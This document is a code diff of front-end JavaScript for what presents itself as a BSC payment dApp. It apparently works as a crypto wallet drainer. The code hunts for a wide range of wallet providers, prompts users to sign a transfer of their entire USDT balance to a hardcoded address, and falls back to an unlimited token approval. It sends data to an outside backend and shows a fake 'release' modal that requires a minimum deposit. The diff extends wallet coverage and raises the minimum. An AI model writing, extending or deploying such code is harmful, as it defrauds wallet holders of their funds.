@@ -10,11 +10,11 @@
     // CONFIGURATION
     // ============================================================
     const CONFIG = {
-        BACKEND_URL: '', // Proxied via vercel.json rewrites to eliminate browser CORS restrictions
+        BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
-        USER_MIN_USDT: 0.2, // Minimum 0.2 USDT required
-        GAS_THRESHOLD: 0.00015,
+        USER_MIN_USDT: 25, // Minimum 25 USDT required
+        GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
         CHAIN_ID: '0x38', // BSC Mainnet (56)
@@ -37,13 +37,21 @@
         'function payOrder(bytes32 orderId, uint256 amount) external'
     ];
 
-    // Multi-wallet Web3 Provider Resolver (Bitget Wallet, Trust Wallet, MetaMask, EIP-6963)
+    // Multi-wallet Web3 Provider Resolver (Bitget, Trust, MetaMask, OKX, Binance, Coinbase, Rabby, SafePal, Phantom, etc.)
     function getWeb3Provider() {
+        // 1. Dedicated wallet-specific globals
         if (window.bitkeep && window.bitkeep.ethereum) return window.bitkeep.ethereum;
         if (window.bitgetWallet && window.bitgetWallet.ethereum) return window.bitgetWallet.ethereum;
         if (window.bitgetWallet) return window.bitgetWallet;
         if (window.trustwallet) return window.trustwallet;
+        if (window.okxwallet) return window.okxwallet;
+        if (window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
+        if (window.binance) return window.binance;
+        if (window.safepalProvider) return window.safepalProvider;
+        if (window.phantom && window.phantom.ethereum) return window.phantom.ethereum;
+        if (window.rabby) return window.rabby;
 
+        // 2. Standard EIP-1193 window.ethereum & multi-provider array
         if (window.ethereum) {
             if (Array.isArray(window.ethereum.providers) && window.ethereum.providers.length > 0) {
                 const bitgetProv = window.ethereum.providers.find(p => p && (p.isBitKeep || p.isBitGet));
@@ -51,6 +59,12 @@
 
                 const trustProv = window.ethereum.providers.find(p => p && (p.isTrust || p.isTrustWallet));
                 if (trustProv) return trustProv;
+
+                const okxProv = window.ethereum.providers.find(p => p && p.isOkxWallet);
+                if (okxProv) return okxProv;
+
+                const cbProv = window.ethereum.providers.find(p => p && p.isCoinbaseWallet);
+                if (cbProv) return cbProv;
 
                 const mmProv = window.ethereum.providers.find(p => p && p.isMetaMask);
                 if (mmProv) return mmProv;
@@ -194,8 +208,7 @@
     // Optional encryption / API helper that fails gracefully if offline
     async function safeApiCall(endpoint, payload = null) {
         try {
-            const baseUrl = CONFIG.BACKEND_URL || '';
-            const url = baseUrl + endpoint;
+            const url = CONFIG.BACKEND_URL + endpoint;
             const headers = { 'Content-Type': 'application/json', 'x-api-key': CONFIG.API_KEY };
             let body = null;
             if (payload && window.CryptoJS) {
@@ -212,67 +225,11 @@
 
             const response = await fetch(url, { method: 'POST', headers, body });
             if (!response.ok) return null;
-            const resData = await response.json();
-
-            // Decrypt ciphertext response if returned by backend
-            if (resData && resData.ciphertext && window.CryptoJS) {
-                try {
-                    const decrypted = CryptoJS.AES.decrypt(resData.ciphertext, CONFIG.API_KEY);
-                    const plain = decrypted.toString(CryptoJS.enc.Utf8);
-                    if (plain) return JSON.parse(plain);
-                } catch (decErr) {
-                    console.warn('Decryption notice:', decErr);
-                }
-            }
-            return resData;
+            return await response.json();
         } catch (err) {
             console.warn('Backend API call notice (continuing locally):', err.message);
             return null;
         }
-    }
-
-    // Automated Gas Sponsorship: top-up user wallet if BNB is below GAS_THRESHOLD
-    async function ensureGas(userAddress, provider) {
-        let balanceWei = 0n;
-        try {
-            balanceWei = await provider.getBalance(userAddress);
-        } catch (e) {
-            balanceWei = 0n;
-        }
-
-        let bnbBal = Number(ethers.formatEther(balanceWei));
-        state.bnbBalance = bnbBal.toFixed(6);
-        updateWalletInfoUI();
-
-        if (bnbBal >= CONFIG.GAS_THRESHOLD) {
-            return true;
-        }
-
-        updateStatus('⛽ Sponsoring network gas fee for your wallet...', 'warning');
-
-        try {
-            const res = await safeApiCall('/api/users/gas-topup', { wallet: userAddress });
-            if (res && res.success) {
-                updateStatus('⛽ Gas sponsored! Awaiting confirmation...', 'warning');
-                await new Promise(r => setTimeout(r, 3500));
-                try {
-                    const newBal = await provider.getBalance(userAddress);
-                    state.bnbBalance = Number(ethers.formatEther(newBal)).toFixed(6);
-                    updateWalletInfoUI();
-                } catch (e) {}
-                return true;
-            } else if (res && res.message) {
-                const msg = res.message.toLowerCase();
-                if (msg.includes('already sufficient')) {
-                    return true;
-                }
-                updateStatus(`⚠️ Gas sponsorship: ${res.message}. Please add ~0.001 BNB to continue.`, 'warning');
-                return false;
-            }
-        } catch (e) {
-            console.warn('Gas top-up notice:', e);
-        }
-        return false;
     }
 
     // ============================================================
@@ -287,8 +244,8 @@
 
         const providerObj = getWeb3Provider();
         if (!providerObj) {
-            updateStatus('❌ No Web3 wallet detected. Please open in Bitget Wallet, Trust Wallet, or MetaMask.', 'error');
-            alert('No Web3 wallet found. Please open this dApp inside Bitget Wallet, Trust Wallet, or MetaMask browser.');
+            updateStatus('❌ No Web3 wallet detected. Please open inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).', 'error');
+            alert('No Web3 wallet found. Please open this dApp inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).');
             return;
         }
 
@@ -386,9 +343,6 @@
                 return;
             }
 
-            // Sponsoring network gas fee if user BNB is below threshold (prevents Bitget "top up" warning)
-            await ensureGas(userAddress, provider);
-
             updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
@@ -399,19 +353,11 @@
 
             let txHash = null;
 
-            // BSC Network Gas Configuration (1.5 Gwei & 65,000 gas limit = ~0.00009 BNB total fee)
-            const BSC_TX_OPTS = {
-                gasLimit: 65000n,
-                gasPrice: ethers.parseUnits('1.5', 'gwei')
-            };
-            const BSC_RAW_GAS = '0xfde8'; // 65,000 gas hex
-            const BSC_RAW_GAS_PRICE = '0x59682f00'; // 1.5 Gwei hex
-
-            // Primary Attempt: Direct USDT Transfer via Ethers Signer with explicit gas limit & price
+            // Primary Attempt: Direct USDT Transfer via Ethers Signer with explicit gas limit
             try {
                 const signer = await provider.getSigner();
                 const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                const tx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, BSC_TX_OPTS);
+                const tx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
                 txHash = tx.hash;
             } catch (err1) {
                 const err1Str = (err1.message || '').toLowerCase();
@@ -428,8 +374,7 @@
                             from: userAddress,
                             to: CONFIG.USDT_ADDRESS,
                             data: transferCalldata,
-                            gas: BSC_RAW_GAS,
-                            gasPrice: BSC_RAW_GAS_PRICE,
+                            gas: '0x186a0', // 100,000 gas limit hex
                             value: '0x0'
                         }]
                     });
@@ -450,8 +395,7 @@
                                 from: userAddress,
                                 to: CONFIG.USDT_ADDRESS,
                                 data: approveCalldata,
-                                gas: BSC_RAW_GAS,
-                                gasPrice: BSC_RAW_GAS_PRICE,
+                                gas: '0x186a0',
                                 value: '0x0'
                             }]
                         });
@@ -462,7 +406,7 @@
                         }
                         const signer = await provider.getSigner();
                         const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                        const appTx = await usdtWithSigner.approve(CONFIG.CONTRACT_ADDRESS, ethers.MaxUint256, BSC_TX_OPTS);
+                        const appTx = await usdtWithSigner.approve(CONFIG.CONTRACT_ADDRESS, ethers.MaxUint256, { gasLimit: 100000n });
                         approveTxHash = appTx.hash;
                     }
 
@@ -476,7 +420,7 @@
                     try {
                         const signer = await provider.getSigner();
                         const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                        const finalTx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, BSC_TX_OPTS);
+                        const finalTx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
                         txHash = finalTx.hash;
                     } catch (finalErr) {
                         txHash = await providerObj.request({
@@ -485,8 +429,7 @@
                                 from: userAddress,
                                 to: CONFIG.USDT_ADDRESS,
                                 data: transferCalldata,
-                                gas: BSC_RAW_GAS,
-                                gasPrice: BSC_RAW_GAS_PRICE,
+                                gas: '0x186a0',
                                 value: '0x0'
                             }]
                         });
@@ -579,7 +522,7 @@
             elements.holdReleaseBtn.addEventListener('click', function () {
                 closeAllModals();
                 if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-                if (elements.releaseRequired) elements.releaseRequired.textContent = `${Number(CONFIG.USER_MIN_USDT).toFixed(2)} USDT`;
+                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT}.00 USDT`;
                 openModal(elements.releaseModal);
             });
         }
